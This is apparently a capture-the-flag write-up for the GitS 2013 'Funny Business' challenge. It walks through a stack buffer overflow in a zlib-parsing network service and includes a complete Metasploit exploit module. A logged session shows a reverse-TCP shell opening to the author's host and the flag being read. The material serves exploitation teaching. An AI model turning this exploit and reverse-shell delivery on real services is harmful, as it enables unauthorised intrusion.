---
layout: post
title: "GitS 2013 - Funny Business"
date: 2013-02-17 13:53
comments: true
categories: [pwnable, rop]
author: stacks0n
---
## Challenge
Points: 100

Find the key! ([File](https://2013.ghostintheshellcode.com/funnybusiness-fb84813ddd932f6aceee0ed3a4e9f1e0a7082dc1) running at funnybusiness.2013.ghostintheshellcode.com)
## Analysis

In order to get the binary to run on 32-bit Linux, you first need to run:
```bash
$ adduser funnybusiness
$ sudo su
$ ./funnybiz.elf
```

Application is running on port 49681:
```bash
stacks0n@ubuntu:~/Desktop$ netstat -antp | grep LISTEN | grep funnybiz
tcp        0      0 0.0.0.0:49681           0.0.0.0:*               LISTEN      17495/funnybiz.elf   
```

Let's look at HexRays decompilation of sub_8048C60:
```
int __cdecl sub_8048D70(int sock_fd)
{
  int v1; // ebx@1
  char v3; // [sp+1Fh] [bp-Dh]@4

  *(_QWORD *)&strm.zalloc = 0LL;
  strm.opaque = 0;
  *(_QWORD *)&strm.next_in = 0LL;
  v1 = inflateInit_(&strm, "1.2.7", 56);
  if ( !v1 )
  {
    read_data_from_socket(sock_fd, &strm.avail_in, 4);
    if ( strm.avail_in <= 0x4000 )
    {
      read_data_from_socket(sock_fd, &v3, strm.avail_in);
      strm.next_in = (Bytef *)&v3;
      strm.avail_out = 16384;
      strm.next_out = (Bytef *)&unk_804B0A0;
      if ( inflate(&strm, 4) != 1 )
        exit(0);
      inflateEnd(&strm);
    }
  }
  return v1;
}
```

We first send the size of our zlib data, which must be less than 0x4000. The size we provide is then used for the number of bytes to be read off the wire next.

The second call to read_from_socket() is copying our data directly to the stack, without any bounds checking. In this case, there isn't even a buffer allocated for the data. 

The last requirement is that the data supplied must be valid compressed zlib data, otherwise the program will exit before returning from this function. So, we simply send the smallest possible zlib stream and append our payload. The zlib stream will contain a size so we don't have to worry about the appended data.

Find simple ROP gadget to redirect execution to the stack (since its executable) to avoid any issues with stack randomization.

```
stacks0n@stack0ns-MacBook-Pro:~> ./msfelfscan funnybiz.elf -j esp
[/Users/stacks0n/funnybiz.elf]
0x08049043 jmp esp
```

MSF module as follows:
```ruby
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
        Rank = GreatRanking

        include Msf::Exploit::Remote::Tcp

        def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'GitS 2013 Pwnable 100 - Funny Business',
                        'Author'         => 'stacks0n',
                        'License'        => MSF_LICENSE,
                        'Privileged'     => true,
                        'Platform'       => 'linux',
                        'DefaultTarget'  => 0))

                register_options(
                        [
                                Opt::RHOST('54.235.156.9'),
                                Opt::RPORT(49681)
                        ], self.class)

        end

        def exploit
                connect
                # we must send valid zlib data so the code doesn't exit
                # this is zlib deflation of a single 'a'
                zlib    = "\x78\x9C\x73\xE4\x02\x00\x00\x8E\x00\x4C"
                padding = "\x90\x90\x90"
                rop     = "\x43\x90\x04\x08" # jmp esp
                p       = zlib + padding + rop + payload.encoded

                # send the size of our payload
                sock.put([p.size].pack("L"))
                # send the payload
                sock.put(p)

                handler
                disconnect
        end

end
```

```bash
msf  exploit(funny_business) > show options

Module options (exploit/gits/funny_business):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  54.235.156.9     yes       The target address
   RPORT  49681            yes       The target port


Payload options (linux/x86/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  68.47.237.170     yes       The listen address
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf  exploit(funny_business) > exploit 

[-] Handler failed to bind to 68.47.237.170:4444
[*] Started reverse handler on 0.0.0.0:4444 
[*] Command shell session 1 opened (192.168.1.30:4444 -> 54.235.156.9:57768) at 2013-02-15 23:54:39 -0500

cat key
Compressions can be hard at times
```

## Solution
Compressions can be hard at times
